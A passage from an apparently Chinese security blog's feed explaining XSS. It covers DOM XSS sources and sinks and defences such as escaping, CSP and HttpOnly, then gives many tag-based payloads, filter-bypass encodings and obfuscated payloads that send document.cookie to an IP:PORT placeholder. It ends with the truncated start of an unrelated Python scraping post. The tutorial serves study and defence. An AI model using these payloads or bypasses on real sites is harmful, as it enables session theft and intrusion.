元素进行添加、移动、改变或移除的方法和属性，都是通过文档对象模型来获得的（DOM）。</p><p>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</p><p>当攻击者可以控制一些DOM对象、输入一些恶意JS代码，而客户端的脚本并没有对用户输入内容进行有效的过滤就传入一些执行危险操纵的函数如eval等或直接输出到页面时，就会导致DOM型XSS漏洞的存在。</p><p>攻击者可以控制一些DOM对象、输入一些恶意JS代码，插入DOM结构，然后未做任何过滤直接输出到页面。</p><p>比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;DOM XSS&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var pos&#x3D;document.URL.indexOf(&quot;name&#x3D;&quot;)+5;</span><br><span class="line">document.write(decodeURI(document.URL.substring(pos,document.URL.length)));</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>获取输入函数</p><ul><li>document.URL</li><li>document.URLUnencoded</li><li>document.location（及其许多属性）</li><li>document.referrer</li><li>window.location（及其许多属性）</li><li>location</li><li>location.href</li><li>location.search</li><li>location.hash</li><li>location.pathname</li></ul><p>输出函数</p><ul><li><p>eval(…)</p></li><li><p>window.execScript(…)</p></li><li><p>window.setInterval(…)</p></li><li><p>window.setTimeout(…)</p></li><li><p>document.write(…)</p></li><li><p>document.writeln(…)</p></li><li><p>element.innerHTML(…)</p></li><li><p>document.forms[0].action=… (and various other collections)</p></li><li><p>document.attachEvent(…)</p></li><li><p>document.create…(…)</p></li><li><p>document.execCommand(…)</p></li><li><p>document.body. … (accessing the DOM through the body object)</p></li><li><p>window.attachEvent(…)</p></li><li><p>document.location=… (and assigning to location’s href, host and hostname)</p></li><li><p>document.location.hostname=…</p></li><li><p>document.location.replace(…)</p></li><li><p>document.location.assign(…)</p></li><li><p>document.URL=…</p></li><li><p>window.navigate(…)</p></li><li><p>document.open(…)</p></li><li><p>window.open(…)</p></li><li><p>window.location.href=… (and assigning to location’s href, host and hostname)</p></li></ul><p>总结：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p><h4 id="业务逻辑"><a href="#业务逻辑" class="headerlink" title="业务逻辑"></a>业务逻辑</h4><p>1、用户的输入未经过数据库,直接拿到前台显示,比如搜索框</p><p>2、用户输入存入数据库,从数据库中取出,然后由相关的视图文件输出到网页,比如用户个人设置中的签名、用户名、用户描述等等</p><p>xss大多出现在输入框中</p><p>3、反射型xss输入在哪里输出就在那里,存储型xss输入之后存入数据库,取出数据库然后可能显示到各种地方</p><h4 id="防御思路"><a href="#防御思路" class="headerlink" title="防御思路"></a>防御思路</h4><h5 id="存储xss和反射xss"><a href="#存储xss和反射xss" class="headerlink" title="存储xss和反射xss"></a>存储xss和反射xss</h5><p>1、纯前端渲染，把代码和数据分隔开。</p><ul><li><p>浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。</p></li><li><p>然后浏览器执行 HTML 中的 JavaScript。</p></li><li><p>JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。</p></li></ul><p>在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（<code>.innerText</code>），还是属性（<code>.setAttribute</code>），还是样式（<code>.style</code>）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。</p><p>但纯前端渲染还需注意避免 DOM 型 XSS 漏洞。</p><p>2、直接使用html实体转义函数,比如php函数<code>htmlspecialchars（）</code>和<code>htmlentities()</code>、<code>escapeHTML</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">字符转义后的字符</span><br><span class="line">&amp;   &amp;</span><br><span class="line">&lt;   &lt;</span><br><span class="line">&gt;   &gt;</span><br><span class="line">&quot;   &quot;</span><br><span class="line">&#39;   &amp;#x27;</span><br><span class="line">&#x2F;   &#x2F;</span><br></pre></td></tr></table></figure><p>不能仅仅靠实体转义函数来防御xss，像<code>javascript:alert(&amp;#x27;XSS&amp;#x27;)</code>这种类型的攻击，实体转义函数就不会对其起作用。</p><p>而且实体转义函数就有局限性，因为如果数据是json格式，双引号被转义会破坏json格式。</p><p>但是我们可以使用<code>escapeEmbedJSON()</code> 函数，对内联 JSON 进行转义。</p><table><thead><tr><th>字符</th><th>转义后的字符</th></tr></thead><tbody><tr><td><code>U+2028</code></td><td><code>\u2028</code></td></tr><tr><td><code>U+2029</code></td><td><code>\u2029</code></td></tr><tr><td><code>&lt;</code></td><td><code>\u003c</code></td></tr></tbody></table><p>应当尽量避免自己写转义库，而应当采用成熟的、业界通用的转义库。因此html转义也完全不能避免xss攻击。</p><table><thead><tr><th>XSS 安全漏洞</th><th>简单转义是否有防护作用</th></tr></thead><tbody><tr><td>HTML 标签文字内容</td><td>有</td></tr><tr><td>HTML 属性值</td><td>有</td></tr><tr><td>CSS 内联样式</td><td>无</td></tr><tr><td>内联 JavaScript</td><td>无</td></tr><tr><td>内联 JSON</td><td>无</td></tr><tr><td>跳转链接</td><td>无</td></tr></tbody></table><h5 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h5><p>在使用 <code>.innerHTML</code>、<code>.outerHTML</code>、<code>document.write()</code> 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 <code>.textContent</code>、<code>.setAttribute()</code> 等。</p><p>DOM 中的内联事件监听器，如 <code>location</code>、<code>onclick</code>、<code>onerror</code>、<code>onload</code>、<code>onmouseover</code> 等，<code>&lt;a&gt;</code> 标签的 <code>href</code> 属性，JavaScript 的 <code>eval()</code>、<code>setTimeout()</code>、<code>setInterval()</code> 等，都能把字符串作为代码运行。</p><h5 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h5><p>1、充分利用 CSP，严格实施 CSP 操作，可以有效防范 XSS 攻击。</p><p>限制加载其他域下的资源文件，这样即使黑客插入了一个 JavaScript 文件，这个 JavaScript 文件也是无法被加载的；</p><p>禁止向第三方域提交数据，这样用户数据也不会外泄；</p><p>2、使用 HttpOnly 属性。避免 js 脚本操作 Cookie，即使页面被注入了恶意 JavaScript 脚本，也是无法获取到设置了 HttpOnly 的数据。因此一些比较重要的数据我们建议设置 HttpOnly 标志。</p><p>3、在用户提交时，由前端过滤输入，然后提交到后端。这种做法是不可取的。一旦攻击者绕过前端过滤，直接构造请求，就可以提交恶意代码了。<br>4、数据插入数据库,取出数据库之后进行转义,然后由视图文件输出到网页。</p><p>5、数据插入数据、取出数据库都不转义,在视图文件中进行转义</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;comment-content&quot;</span>&gt;&lt;?php echo htmlspecialchars($comment[<span class="string">&#x27;content&#x27;</span>];) ?&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>1、xss的防御不仅仅只是前端或者只是后端应该关注的问题。防范存储型和反射型 XSS 是后端的责任。而 DOM 型 XSS 攻击不发生在后端，是前端的责任。防范 XSS 是需要后端和前端共同参与的系统工程。</p><p>2、关于转义的位置不能仅仅在输入出转义，转义应该在输出 HTML 时进行，而不是在提交用户输入时。</p><p>3、html实体转义函数并不能完全防御xss。每一个转义函数转义的对象不同，因此不可能对用户的任何输入类型都进行转义。HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等，所需要的转义规则不一致。 需要选取合适的转义库，并针对不同的上下文调用不同的转义规则。</p><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><p>1、如果前端限制,尝试burp抓包改包</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># XSS-Payload</span></span><br><span class="line">https:<span class="comment">//github.com/TheKingOfDuck/fuzzDicts/tree/master/easyXssPayload</span></span><br><span class="line">https:<span class="comment">//github.com/ZephrFish/XSSPayloads/blob/master/raw_payloads</span></span><br><span class="line">https:<span class="comment">//github.com/silience/xsspayload</span></span><br><span class="line">https:<span class="comment">//github.com/willc/XSSpayloads/blob/master/xss_payloads_6-20-12.txt</span></span><br><span class="line">https:<span class="comment">//github.com/AeolusTF/XssPayload/blob/master/XssPayload.txt</span></span><br></pre></td></tr></table></figure><p>2、xsspayload可以一条一条的测试,同样我们可以直接全部复制粘贴,根据弹框数字去我们的payload中找到可用的语句,同样也可以借助burp等工具fuzz测试</p><p>3、手工测试常见标签</p><p><code>&lt;img&gt;</code>标签</p><p>利用方式1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;javascript:alert(&quot;xss&quot;)&gt;</span><br><span class="line">&lt;IMG SRC&#x3D;javascript:alert(String.formCharCode(88,83,83))&gt;</span><br><span class="line">&lt;img scr&#x3D;&quot;URL&quot; style&#x3D;&#39;Xss:expression(alert(&#x2F;xss));&#39;</span><br><span class="line">&lt;!--CSS标记xss--&gt;</span><br><span class="line">&lt;img STYLE&#x3D;&quot;background-image:url(javascript:alert(&#39;XSS&#39;))&quot;&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;alert(1)&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;eval(&quot;alert(&#39;xss&#39;)&quot;)&gt;</span><br><span class="line">&lt;img src&#x3D;1 onmouseover&#x3D;alert(&#39;xss&#39;)&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;a&gt;</code>标签</p><p>标准格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;www.baidu.com&quot;&gt;baidu&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p>方式1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;javascript:eval(alert(&#39;xss&#39;))&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;javascript:aaa&quot; onmouseover&#x3D;&quot;alert(&#x2F;xss&#x2F;)&quot;&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;xss&#39;)&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;&quot; onclick&#x3D;eval(alert(&#39;xss&#39;))&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;kycg.asp?ttt&#x3D;1000 onmouseover&#x3D;prompt(&#39;xss&#39;) y&#x3D;2016&gt;aa&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p><code>input</code>标签</p><p>标准格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;&quot;name&quot; value&#x3D;&quot;&quot;&gt;</span><br></pre></td></tr></table></figure><p>XSS利用方式1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input value&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;xss&#39;) type&#x3D;&quot;text&quot;&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;name&quot; value&#x3D;&quot;&quot; onmouseover&#x3D;prompt(&#39;xss&#39;) bad&#x3D;&quot;&quot;&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;name&quot; value&#x3D;&quot;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;form&gt;标签</code></p><p>XSS利用方式1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;javascript:alert(&#39;xss&#39;) method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">&lt;form action&#x3D;javascript:alert(&#39;xss&#39;)&gt;</span><br><span class="line">&lt;form method&#x3D;post action&#x3D;aa.asp? onmouseover&#x3D;prompt(&#39;xss&#39;)&gt;</span><br><span class="line">&lt;form method&#x3D;post action&#x3D;aa.asp? onmouseover&#x3D;alert(&#39;xss&#39;)&gt;</span><br><span class="line">&lt;form action&#x3D;1 onmouseover&#x3D;alert(&#39;xss)&gt;</span><br><span class="line">&lt;!--原code--&gt;</span><br><span class="line">&lt;form method&#x3D;post action&#x3D;&quot;data:text&#x2F;html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;</span><br><span class="line">&lt;!--base64编码--&gt;</span><br><span class="line">&lt;form method&#x3D;post action&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4&#x3D;&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;iframe&gt;</code>标签</p><p>XSS利用方式1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;javascript:alert(&#39;xss&#39;);height&#x3D;5width&#x3D;1000 &#x2F;&gt;&lt;iframe&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line">&lt;!--原code--&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;</span><br><span class="line">&lt;!--base64编码--&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4&#x3D;&quot;&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;aaa&quot; onmouseover&#x3D;alert(&#39;xss&#39;) &#x2F;&gt;&lt;iframe&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;javascript&amp;colon;prompt&amp;lpar;&#96;xss&#96;&amp;rpar;&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure><p><code>svg&lt;&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><h4 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h4><p>绕过思路有很多,但是分类却有点难,实在是不知道怎么去定义每一类的绕过思路。</p><h5 id="1、过滤关键字"><a href="#1、过滤关键字" class="headerlink" title="1、过滤关键字"></a>1、过滤关键字</h5><ul><li><p>大小写绕过、大小写混合</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ScRipt&gt;ALeRt(&quot;XSS&quot;);&lt;&#x2F;sCRipT&gt;</span><br></pre></td></tr></table></figure></li><li><p>嵌套,也就是重复</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>代替</p><p>iframe就可以代替script<br>confirm和prompt可以代替alert</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;marquee/onstart=confirm(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;details/open/ontoggle=top[<span class="string">&quot;al&quot;</span>+<span class="string">&quot;ert&quot;</span>](<span class="number">1</span>)&gt; 谷歌浏览器 【绕阿里云XSS】</span><br><span class="line">&lt;svg/onload=prompt(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;style onload=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;iframe src=javascript:alert`<span class="number">1</span>`&gt;</span><br><span class="line">&lt;body onload=prompt(<span class="number">1</span>);&gt;</span><br><span class="line">&lt;<span class="keyword">select</span> autofocus onfocus=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;script&gt;confirm(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;prompt(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>HTML5 新增的实体命名编码</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp;colon; =&gt; [冒号]</span><br><span class="line"></span><br><span class="line">&amp;NewLine; =&gt; [换行]</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span>: &lt;a href=<span class="string">&quot;javasc&amp;NewLine;ript&amp;colon;alert(1)&quot;</span>&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure></li><li><p>编码</p><p>HTML实体可以使用十进制与十六进制编码;</p><p>javascript可以使用Unicode与八进制与十六进制进行编码.</p><p><code>eval()</code>函数可计算某个字符串,并执行其中的的 JavaScript 代码,可以吧js代码转化为jsunicode,jsunicode可以使用网站<code>http://web.chacuo.net/charsetjsascii</code></p><p>将payload进行进制转化,十六进制前面+<code>&amp;#x</code>,十进制+<code>&amp;#</code></p><p><strong>对于JS编码</strong></p><ul><li><p>unicode配合js的eval函数</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  &lt;img src=<span class="string">&quot;1&quot;</span> onerror=eval(<span class="string">&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#117;&amp;#110;&amp;#105;&amp;#99;&amp;#111;&amp;#100;&amp;#101;&amp;#39;&amp;#41;&quot;</span>)&gt;&lt;/img&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;1&quot;</span> onerror=eval(<span class="string">&quot;\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0075\u006e\u0069\u0063\u006f\u0064\u0065\u0027\u0029&quot;</span>)&gt;&lt;/img&gt;</span><br></pre></td></tr></table></figure></li><li><p>八进制与十六进制编码</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;eval(<span class="string">&quot;\141\154\145\162\164\50\57\170\163\163\57\51&quot;</span>);&lt;/script&gt;（JS八进制编码）</span><br></pre></td></tr></table></figure><script>eval("\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29");</script>（JS十六进制编码）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- String.fromCharCode</span><br><span class="line"></span><br><span class="line">  &#96;&#96;&#96;csharp</span><br><span class="line">&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;eval(String.fromCharCode(97,108,101,114,116,40,39,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,10 1,39,41))&gt;&lt;&#x2F;img&gt;</span><br></pre></td></tr></table></figure></li><li><p>data协议</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;object data&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgnZGF0YSBwcm90b2NvbCcpPC9zY3JpcHQ+&quot;&gt;&lt;&#x2F;object&gt;</span><br></pre></td></tr></table></figure></li></ul><p><strong>对html编码</strong></p><ul><li><p>十进制与十六进制</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="string">&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;</span>&gt;  （HTML实体十进制编码)</span><br><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="string">&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2f;&amp;#x29;&quot;</span>&gt; (HTML实体十六进制编码)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**js特性**</span><br><span class="line"></span><br><span class="line">| Payload                                          | 效果                   |</span><br><span class="line">| ------------------------------------------------ | ---------------------- |</span><br><span class="line">| &#96;&#39;alert(&quot;xss&quot;)&#39;.replace(&#x2F;.*&#x2F;g,eval)&#96;             | &#96;eval(&#39;alert(&quot;xss&quot;)&#39;)&#96; |</span><br><span class="line">| &#96;&#39;str1ng&#39;.replace(&#x2F;1&#x2F;,alert)&#96;                    | &#96;alert(1)&#96;             |</span><br><span class="line">| &#96;&#39;bbbalert(1)cccc&#39;.replace(&#x2F;a\w&#123;4&#125;\(\d\)&#x2F;,eval)&#96; | &#96;eval(&#39;alert(1)&#39;)&#96;     |</span><br><span class="line"></span><br><span class="line">​&#96;&#96;&#96;csharp</span><br><span class="line">&lt;script&gt;&#39;str1ng&#39;.replace(&#x2F;1&#x2F;,alert)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h5 id="2、过滤符号"><a href="#2、过滤符号" class="headerlink" title="2、过滤符号"></a>2、过滤符号</h5><ul><li><p>过滤空格</p><h6 id="用-或者"><a href="#用-或者" class="headerlink" title="用/**/或者/"></a>用<code>/**/</code>或者<code>/</code></h6><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=<span class="string">&quot;1&quot;</span>/onerror=<span class="string">&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2f;&amp;#x29;&quot;</span>&gt;</span><br><span class="line">&lt;img<span class="comment">/**/</span>src=<span class="string">&quot;1&quot;</span><span class="comment">/**/</span>onerror=<span class="string">&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2f;&amp;#x29;&quot;</span>&gt;</span><br></pre></td></tr></table></figure></li></ul><h5 id="3、常用函数"><a href="#3、常用函数" class="headerlink" title="3、常用函数"></a>3、常用函数</h5><ul><li><p>atob()与btoa()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">atob(<span class="string">&quot;L2h0dHA6Lw==&quot;</span>)</span><br><span class="line"><span class="string">&quot;/http:/&quot;</span></span><br><span class="line">btoa(/http:/)</span><br><span class="line"><span class="string">&quot;L2h0dHA6Lw==&quot;</span></span><br></pre></td></tr></table></figure><p>在 JavaScript 中，有两个函数被分别用来处理解码和编码 base64 字符串：</p><ul><li>atob() //ASCII to Base64</li><li>btoa() //Base64 to ASCII</li></ul></li><li><p>slice()</p><p>slice() 方法可从已有的数组中返回选定的元素</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arrayObject.slice(start,end)</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atob(btoa(&#x2F;http:&#x2F;)).slice(1).concat(&#x2F;IP:PORT&#x2F;).concat(eval(atob(btoa(&#x2F;docum&#x2F;)).slice(1,-1).concat(atob(btoa(&#x2F;ent.cookie&#x2F;)).slice(1,-1))))</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200621144413840.png" alt="image-20200621144413840"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload&#x3D;location.href&#x3D;eval(atob(btoa(&#x2F;docu&#x2F;)).slice(1,-1).concat(atob(btoa(&#x2F;ment.cookie&#x2F;)).slice(1,-1)))&gt;</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200621153113215.png" alt="image-20200621153113215"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;xss&quot;&gt;&lt;a href=&quot;#xss&quot; class=&quot;headerlink&quot; title=&quot;xss&quot;&gt;&lt;/a&gt;xss&lt;/h4&gt;&lt;h4 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h4&gt;&lt;p</summary>
      
    
    
    
    <category term="前端安全" scheme="http://s1eady.top/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="OWSP-TOP10" scheme="http://s1eady.top/tags/OWSP-TOP10/"/>
    
  </entry>
  
  <entry>
    <title>Python学习--Python爬虫基础</title>
    <link href="http://s1eady.top/2018/12/07/Python%E7%88%AC%E8%99%AB/"/>
    <id>http://s1eady.top/2018/12/07/Python%E7%88%AC%E8%99%AB/</id>
    <published>2018-12-06T23:20:30.000Z</published>
    <updated>2020-10-16T11:37:12.730Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Python爬虫"><a href="#Python爬虫" class="headerlink" title="Python爬虫"></a>Python爬虫</h3><h3 id="Requests库"><a href="#Requests库" class="headerlink" title="Requests库"></a>Requests库</h3><h5 id="Get请求"><a href="#Get请求" class="headerlink" title="Get请求"></a>Get请求</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 带参数的GET请求,timeout请求超时时间</span></span><br><span class="line">headers = 